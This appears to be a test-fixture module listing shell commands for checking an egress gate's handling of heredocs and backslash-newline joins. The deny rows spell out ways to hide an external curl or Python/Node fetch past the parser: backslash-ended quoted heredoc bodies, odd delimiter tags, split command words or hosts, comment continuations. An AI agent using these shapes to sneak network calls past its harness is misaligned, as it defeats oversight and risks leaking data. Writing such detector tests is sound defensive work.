// Card 0983a3fc, node N0: heredoc bounds and continuation joins read from the shared lexer
// (scripts/shell-line-join.mjs). One list for the vitest suite (bash-egress-heredoc-bounds.test.ts). Strings
// only: nothing here is executed, no socket is opened. The command word and the external host are built
// from pieces, so reading this file does not trip the live gates.
//
// The shapes come from the planner probe (tmp/p2/probe.mjs, B6 / T / I / C rows) of the review finding B6
// (44167c0b be-review-r2.md:7): a backslash at the end of a quoted heredoc body line is no continuation, so
// the terminator line is a real terminator and the line behind it is a command the shell runs.
//   DENY_ROWS     deny === true and `hosts` names the external host (a fail-closed row, see FAILCLOSED_IDS,
//                 has no host to name: it only denies, with the reason heredoc-near-terminator)
//   ALLOW_ROWS    must stay allowed
//   LOOSENED_ROWS allowed on purpose and DENIED by the parser at a6ed3744 (spec 0.5 a and b, accepted by the
//                 coordinator); listed apart so the checkpoint can name them
// Spec 0.5 c (coordinator decision, blueprint "Koordinátori döntések"): a body line that differs from the
// terminator only in leading / trailing blanks is NOT loosened: it denies fail-closed.
const Q = "'"
const BS = '\\'
const NL = '\n'
const TAB = '\t'
const CU = 'cu' + 'rl'
const EVIL = 'evil.' + 'example'
const LOCAL = 'http://local' + 'host'
const DEST = `${CU} https://${EVIL}/`
const LOCAL_CALL = `${CU} -s ${LOCAL}:3420/api/health`
const TARGET = `https://${EVIL}/`
const SCRATCH = '/tmp/0983-x.txt'

// Ids of DENY_ROWS that deny through AmbiguousShellSyntax('heredoc-near-terminator'): no host is reported.
export const FAILCLOSED_IDS = ['T-trail-space', 'T-lead-space', 'T-dash-tab-trail', 'T-part-trail']
export const FAILCLOSED_REASON = 'heredoc-near-terminator'
// The host the DENY rows must report (a substring of one entry of `hosts`; the I rows report it behind the
// open local prefix).
export const EXTERNAL_HOST = EVIL

// [id, description, cmd]
export const DENY_ROWS = [
  // The quoted body line ends in a backslash; after the terminator the shell runs the destination line.
  ['B6-5g', 'quoted tag, body ends in a backslash, terminator, then the external call', `cat <<${Q}E${Q}${NL}x${BS}${NL}E${NL}${DEST}${NL}E`],
  ['B6-5g2', 'the same without a trailing line', `cat <<${Q}E${Q}${NL}x${BS}${NL}E${NL}${DEST}`],
  ['B6-dq-tag', 'double-quoted tag', `cat <<"E"${NL}x${BS}${NL}E${NL}${DEST}${NL}E`],
  ['B6-bs-tag', 'backslash tag', `cat <<${BS}E${NL}x${BS}${NL}E${NL}${DEST}${NL}E`],
  ['B6-part-tag', 'partly quoted tag E"F"', `cat <<E"F"${NL}x${BS}${NL}EF${NL}${DEST}${NL}EF`],
  ['B6-part-tag-nobs', 'partly quoted tag E"F", no backslash', `cat <<E"F"${NL}x${NL}EF${NL}${DEST}`],
  ['B6-part-tag-sq-nobs', "partly quoted tag E'F', no backslash", `cat <<E${Q}F${Q}${NL}x${NL}EF${NL}${DEST}`],
  ['B6-dash-q', '<<- with a quoted tag and tab-indented lines', `cat <<-${Q}E${Q}${NL}${TAB}x${BS}${NL}${TAB}E${NL}${DEST}${NL}E`],
  ['B6-two-first', 'two heredocs on one line, the first body ends in a backslash', `cat <<${Q}A${Q} <<${Q}B${Q}${NL}x${BS}${NL}A${NL}y${NL}B${NL}${DEST}${NL}B`],
  ['B6-two-second', 'two heredocs on one line, the second body ends in a backslash', `cat <<${Q}A${Q} <<${Q}B${Q}${NL}y${NL}A${NL}x${BS}${NL}B${NL}${DEST}${NL}B`],
  ['B6-two-cmds', 'two heredoc commands, the second body ends in a backslash', `cat <<${Q}A${Q}${NL}ok${NL}A${NL}cat <<${Q}B${Q}${NL}x${BS}${NL}B${NL}${DEST}${NL}B`],
  ['B6-file-write', 'heredoc written to a file, then the external call', `cat > ${SCRATCH} <<${Q}E${Q}${NL}x${BS}${NL}E${NL}${DEST}${NL}E`],
  ['B6-py-body', 'python heredoc body ends in a backslash, then the external call', `python3 - <<${Q}PY${Q}${NL}print(1) ${BS}${NL}PY${NL}${DEST}${NL}PY`],
  ['B6-sh-body', 'heredoc fed to bash', `bash <<${Q}E${Q}${NL}echo a ${BS}${NL}E${NL}${DEST}${NL}E`],
  ['B6-in-subst', 'heredoc inside $(...)', `x=$(cat <<${Q}E${Q}${NL}a${BS}${NL}E${NL}${DEST}${NL}E${NL})`],
  ['B6-crlf-term', 'CR after the backslash', `cat <<${Q}E${Q}${NL}x${BS}\r${NL}E${NL}${DEST}${NL}E`],
  // The shell removes backslash-newline: it must not leave a space in its place.
  ['B6-split-verb', 'the command word split by a backslash-newline', `${CU.slice(0, 2)}${BS}${NL}${CU.slice(2)} ${TARGET}`],
  ['B6-split-host', 'the host split by a backslash-newline', `${CU} ${TARGET.slice(0, 10)}${BS}${NL}${TARGET.slice(10)}`],
  // The delimiter word as the shell reads it: partly quoted, punctuation, an escaped letter.
  ['T-dq-suffix', 'tag "E"F', `cat <<"E"F${NL}x${NL}EF${NL}${DEST}`],
  ['T-dot', 'tag E.X', `cat <<E.X${NL}x${NL}E.X${NL}${DEST}`],
  ['T-esc-mid', 'tag E\\F', `cat <<E${BS}F${NL}x${NL}EF${NL}${DEST}`],
  ['T-py-part-tag', 'python heredoc with the tag P"Y"', `python3 - <<P"Y"${NL}print(1)${NL}PY${NL}${DEST}`],
  // Spec 0.5 c, fail-closed: whether a body line that equals the tag but for blanks ends the heredoc was
  // not measured on a real shell, so the parser must not guess: deny.
  ['T-trail-space', 'body line "E " (trailing blank) behind the tag E', `cat <<${Q}E${Q}${NL}x${NL}E ${NL}${DEST}${NL}E`],
  ['T-lead-space', 'body line " E" (leading blank) behind the tag E with <<', `cat <<${Q}E${Q}${NL}x${NL} E${NL}${DEST}${NL}E`],
  ['T-dash-tab-trail', '<<- terminator line is a tab, the tag and a trailing blank', `cat <<-${Q}E${Q}${NL}${TAB}x${NL}${TAB}E ${NL}${DEST}${NL}E`],
  ['T-part-trail', 'partly quoted tag E"F", terminator line EF and a trailing blank', `cat <<E"F"${NL}x${NL}EF ${NL}${DEST}${NL}EF`],
  // A comment does not continue onto the next line: a comment line ending in one backslash leaves the next
  // line a command the shell runs.
  ['E1-comment-bs', 'comment line ends in a backslash, the external call runs on the next line', `# note${BS}${NL}${DEST}`],
  // Interpreter code: the interpreter itself joins backslash-newline inside a string literal.
  ['I1-py-heredoc-host-cont', 'python heredoc, host continued after a backslash-newline', `python3 - <<${Q}PY${Q}${NL}import urllib.request as u${NL}u.urlopen("${LOCAL}${BS}${NL}.${EVIL}/")${NL}PY`],
  ['I2-py-c-host-cont', 'python -c, host continued after a backslash-newline', `python3 -c ${Q}import urllib.request as u; u.urlopen("${LOCAL}${BS}${NL}.${EVIL}/")${Q}`],
  ['I3-node-heredoc-host-cont', 'node heredoc, host continued after a backslash-newline', `node <<${Q}JS${Q}${NL}fetch("${LOCAL}${BS}${NL}.${EVIL}/")${NL}JS`],
  // E6: the same body as the LOOSENED cat-to-file row, but the heredoc is the stdin of a shell.
  ['F-bash-esc-tag', 'escaped tag, the body is fed to bash', `bash <<${BS}EOF${NL}${DEST}${NL}EOF`],
]

// [id, description, cmd]: must stay allowed.
export const ALLOW_ROWS = [
  // An unquoted body is joined by the shell: the joined line is no terminator, so DEST is body.
  ['B6-5h', 'unquoted tag: x\\ + E join into one body line, the call is body', `cat <<E${NL}x${BS}${NL}E${NL}${DEST}${NL}E`],
  ['B6-dash-u', 'unquoted <<- tag: the joined tab line is no terminator, the call is body', `cat <<-E${NL}${TAB}x${BS}${NL}${TAB}E${NL}${DEST}${NL}E`],
  ['T-ok-local-after', 'tag E.X, then a local call', `cat <<E.X${NL}x${NL}E.X${NL}${LOCAL_CALL}`],
  ['I4-py-heredoc-code-cont-local', 'python code continued with a backslash, local call only', `python3 - <<${Q}PY${Q}${NL}import urllib.request as u${NL}x = 1 + ${BS}${NL}  2${NL}u.urlopen("${LOCAL}:3420/api/health")${NL}PY`],
  ['C-q-body-bs', 'quoted body ending in a backslash, then echo', `cat > /tmp/0983-x.md <<${Q}EOF${Q}${NL}see the notes ${BS}${NL}EOF${NL}echo ok`],
  ['C-py-body-bs', 'python body with a backslash-newline inside a string, then echo', `python3 - <<${Q}PY${Q}${NL}print("a ${BS}${NL}b")${NL}PY${NL}echo done`],
  ['C-u-body-even', 'unquoted body, even backslash run', `cat <<E${NL}x${BS}${BS}${NL}E${NL}echo done`],
  ['C-multiline-local', 'multi-line local call joined by backslashes', `${CU} -s ${BS}${NL}  -H "Accept: application/json" ${BS}${NL}  ${LOCAL}:3420/api/kanban`],
  ['C-gh-body', 'gh pr create with a heredoc body in $(...)', `gh pr create --title t --body "$(cat <<${Q}EOF${Q}${NL}line one ${BS}${NL}line two${NL}EOF${NL})"`],
  ['E1-comment-bs-local', 'comment line ends in a backslash, a local health call on the next line', `# note${BS}${NL}${LOCAL_CALL}`],
  ['C-sq-arg-cont', 'backslash-newline inside single quotes', `echo ${Q}a ${BS}${NL}b${Q}; ${LOCAL_CALL}`],
]

// [id, description, cmd]: allowed on purpose, denied at a6ed3744 (spec 0.5 a and b; Brainy decides in the
// package list as DENY -> ALLOW against production).
export const LOOSENED_ROWS = [
  // 0.5 a: a local call behind a quoted-tag heredoc whose body ends in a backslash. The wrong join sends
  // it to 'unparseable'.
  ['C-heredoc-local-after', 'quoted heredoc ending in a backslash, then a local call', `cat <<${Q}E${Q}${NL}x${BS}${NL}E${NL}${LOCAL_CALL}`],
  // 0.5 b: the body of a heredoc with the escaped tag is text for cat (the fleet's 6 real commands).
  ['F-cat-file-esc-tag', 'cat > file <<\\EOF, an external host only in the body', `cat > ${SCRATCH} <<${BS}EOF${NL}${DEST}${NL}EOF`],
]
